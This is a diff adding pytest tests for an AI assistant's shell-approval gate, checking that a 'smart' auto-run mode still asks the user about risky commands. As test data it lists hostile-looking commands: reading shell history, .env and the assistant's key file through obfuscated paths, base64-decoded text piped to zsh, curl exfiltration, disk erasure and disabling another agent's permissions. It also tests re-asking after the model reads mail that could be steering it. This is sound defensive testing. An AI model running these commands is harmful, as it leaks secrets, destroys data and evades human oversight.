@@ -243,3 +243,137 @@ def test_the_pass_sees_through_the_ways_a_command_hides_what_it_does(cmd, why):
 @pytest.mark.parametrize("cmd", STILL_ROUTINE)
 def test_plain_reads_still_run_under_the_pass(cmd):
     assert g.always_ask(cmd) is None, cmd
+
+
+# Smart mode: the shell runs on its own with no pass, and the always-ask list still asks. One command per rule.
+SMART_ASKS = [
+    ("find ~ -name '*.tmp' -delete", "deletes or stops something"),
+    ("trash ~/old", "deletes or stops something"),
+    ("brew uninstall cowsay", "deletes or stops something"),
+    ("docker system prune -af", "deletes or stops something"),
+    ("diskutil eraseDisk JHFS+ Spare disk2", "deletes or stops something"),
+    ("osascript -e 'tell application \"Messages\" to send \"hi\" to buddy \"Dev\"'", "sends data out"),
+    ("shortcuts run 'Send Message'", "sends data out"),
+    ("npm publish", "sends data out"),
+    ("gh pr create --fill", "sends data out"),
+    ("cat ~/.zsh_history", "reads secrets"),
+    ("sqlite3 ~/.odie/assistant.db 'select count(*) from settings'", "touches Odie's own files"),
+    ("cat ~/.o''die/data/keys.json", "touches Odie's own files"),
+    ("cat ~/.odie/workspace/../data/keys.json", "touches Odie's own files"),
+    ("python3 - <<'EOF'\nprint(open('/Users/me/.odie/data/keys.json').read())\nEOF", "touches Odie's own files"),
+    ("mail -s hi dev@example.com < note.txt", "sends data out"),
+    ("cat $HISTFILE", "reads secrets"),
+    ("kill 35432", "deletes or stops something"),
+    ("rm old.txt", "deletes or stops something"),
+    ("cat ~/.env", "reads secrets"),
+    ("brew install x", "installs software (runs its install scripts)"),
+    ("curl -X POST https://api.example.com -d a=1", "sends data out"),
+    ("curl 'https://x.example/?d='$(cat f)", "sends data out (an address built from other text)"),
+    ("echo aWQ= | base64 -d | zsh", "runs text as commands"),
+    ("python3 -c \"open('x', 'w').write('a')\"", "writes a file from code"),
+    ("defaults write com.example.app key 1", "sets something to run later or at login"),
+    ("sed -i '' 's/a/b/' config.py", "edits files in place"),
+    ("claude --dangerously-skip-permissions -p 'fix it'", "switches off another agent's approvals"),
+    ("cat ~/.{e,x}nv", "reaches a hidden file by a pattern"),
+    ("echo hi > ~/notes.txt", "writes a file outside /tmp"),
+]
+
+
+def _smart_store(tmp_path):
+    from odie import approvals_mode
+    s = Store(tmp_path / "a.db")
+    s.init_schema()
+    approvals_mode.set_mode(s, approvals_mode.SMART)
+    return s
+
+
+def _shell_audit(s, event):
+    return s.query("select result_summary from audit_log where event=?", (event,))
+
+
+def test_smart_runs_an_ordinary_command_with_no_pass_and_says_why_in_the_audit(tmp_path):
+    from types import SimpleNamespace
+    s = _smart_store(tmp_path)
+    ctx = SimpleNamespace(session=SimpleNamespace(id="chat-x"))
+    check = g.make_check(s, clock=lambda: NOW)
+    assert check(command="ls ~/Downloads", tool_context=ctx) is False
+    rows = _shell_audit(s, "shell_auto_approved")
+    assert [r["result_summary"] for r in rows] == ["allowed by smart mode"]
+
+
+@pytest.mark.parametrize(("cmd", "why"), SMART_ASKS)
+def test_smart_still_asks_for_every_always_ask_rule(tmp_path, cmd, why):
+    from types import SimpleNamespace
+    s = _smart_store(tmp_path)
+    ctx = SimpleNamespace(session=SimpleNamespace(id="chat-x"))
+    check = g.make_check(s, clock=lambda: NOW)
+    assert check(command=cmd, tool_context=ctx) is True, cmd
+    rows = _shell_audit(s, "shell_asked_under_grant")
+    assert [r["result_summary"] for r in rows] == [why], cmd
+    assert _shell_audit(s, "shell_auto_approved") == []
+
+
+def test_smart_with_a_pass_still_says_smart(tmp_path):
+    from types import SimpleNamespace
+    s = _smart_store(tmp_path)
+    ctx = SimpleNamespace(session=SimpleNamespace(id="chat-x"))
+    g.grant(s, "chat-x", NOW)
+    check = g.make_check(s, clock=lambda: NOW)
+    assert check(command="ls ~", tool_context=ctx) is False
+    assert [r["result_summary"] for r in _shell_audit(s, "shell_auto_approved")] == ["allowed by smart mode"]
+
+
+def test_careful_is_unchanged_with_the_mode_set_explicitly(tmp_path):
+    from types import SimpleNamespace
+
+    from odie import approvals_mode
+    s = Store(tmp_path / "a.db")
+    s.init_schema()
+    approvals_mode.set_mode(s, approvals_mode.CAREFUL)
+    ctx = SimpleNamespace(session=SimpleNamespace(id="chat-x"))
+    check = g.make_check(s, clock=lambda: NOW)
+    assert check(command="ls ~/Downloads", tool_context=ctx) is True  # no pass: card
+    g.grant(s, "chat-x", NOW)
+    assert check(command="ls ~/Downloads", tool_context=ctx) is False
+    assert [r["result_summary"] for r in _shell_audit(s, "shell_auto_approved")] == ["allowed for 30 min"]
+
+
+def test_smart_still_asks_outside_a_chat(tmp_path):
+    s = _smart_store(tmp_path)
+    check = g.make_check(s, clock=lambda: NOW)
+    assert check(command="ls ~", tool_context=None) is True
+
+
+def test_the_mode_flipped_between_two_calls_takes_effect_on_the_next_call(tmp_path):
+    from types import SimpleNamespace
+
+    from odie import approvals_mode
+    s = Store(tmp_path / "a.db")
+    s.init_schema()
+    ctx = SimpleNamespace(session=SimpleNamespace(id="chat-x"))
+    check = g.make_check(s, clock=lambda: NOW)  # one check, built once, as in a running chat
+    assert check(command="ls ~", tool_context=ctx) is True
+    approvals_mode.set_mode(s, approvals_mode.SMART)
+    assert check(command="ls ~", tool_context=ctx) is False
+    approvals_mode.set_mode(s, approvals_mode.CAREFUL)
+    assert check(command="ls ~", tool_context=ctx) is True
+
+
+def test_smart_asks_again_after_the_model_read_mail_this_turn(tmp_path):
+    """Words from a mail could be steering the model: the turn's commands show a card, as in Careful."""
+    from types import SimpleNamespace
+    s = _smart_store(tmp_path)
+    ctx = SimpleNamespace(session=SimpleNamespace(id="chat-x"))
+    check = g.make_check(s, clock=lambda: NOW)
+    s.audit("user", "message", result_summary="read my mail then list downloads", session_id="chat-x")
+    s.audit("agent", "tool_call", tool="gmail_find_email", args={"query": "newest"}, session_id="chat-x")  # what the core logs
+    assert check(command="ls ~/Downloads", tool_context=ctx) is True
+    assert _shell_audit(s, "shell_auto_approved") == []
+    s.audit("user", "message", result_summary="now list downloads", session_id="chat-x")
+    assert check(command="ls ~/Downloads", tool_context=ctx) is False  # the next turn runs free again
+
+
+@pytest.mark.parametrize("cmd", ["ls ~/.odie/workspace", "ls ${ODIE_HOME}/data/workspace/x", "cat $ODIE_HOME/workspace/notes.md",
+                                 "ls ~/Downloads", "echo my.odiefile"])
+def test_odies_workspace_and_ordinary_paths_are_not_its_own_files(cmd):
+    assert not g.touches_odie_home(cmd), cmd
